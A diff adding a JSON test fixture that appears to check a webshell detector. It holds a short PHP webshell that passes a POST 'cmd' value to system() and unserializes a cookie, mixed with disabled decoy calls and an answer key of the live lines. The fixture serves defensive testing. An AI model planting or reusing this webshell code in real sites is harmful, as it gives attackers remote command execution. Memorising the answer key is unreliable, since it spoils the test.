@@ -1,0 +1,10 @@
+{
+ "material": "<html><body><h1>status</h1>\n<p>Old builds called system() here.</p>\n<?php\n$k = $_SERVER['HTTP_X_STAGE_KEY'];\n$c = $_POST['cmd'];\n// eval($_POST['code']);  legacy loader, disabled\n$note = \"shell_exec('id') is how the old fixture did it\";\nif (false) {\n    passthru($c);\n}\n$out = system($c);\n$blob = unserialize(base64_decode($_COOKIE['sess']));\nfile_put_contents('/tmp/o.txt', $out);\nreturn;\nexec($_GET['late']);\n?>\n</body></html>\n",
+ "rep": "webshell",
+ "transform": "live",
+ "key": null,
+ "expected": "11:system,12:unserialize,13:file_put_contents",
+ "note": "webshell-request-primitive-model: lib.codec.webshell_model -> field 'live' (live = `line:api`, comma-joined); source ws_src/ws_php_stages.php",
+ "generator_cmd": "python3 -I tests/data/script_fixtures/ws_gen.py tests/data/script_fixtures/ws_src  (stdlib; literal shell sources)",
+ "oracle_cmd": "php tests/data/script_fixtures/ws_oracle.php tests/data/script_fixtures/ws_src/ws_php_stages.php  (PHP token_get_all lexer)"
+}
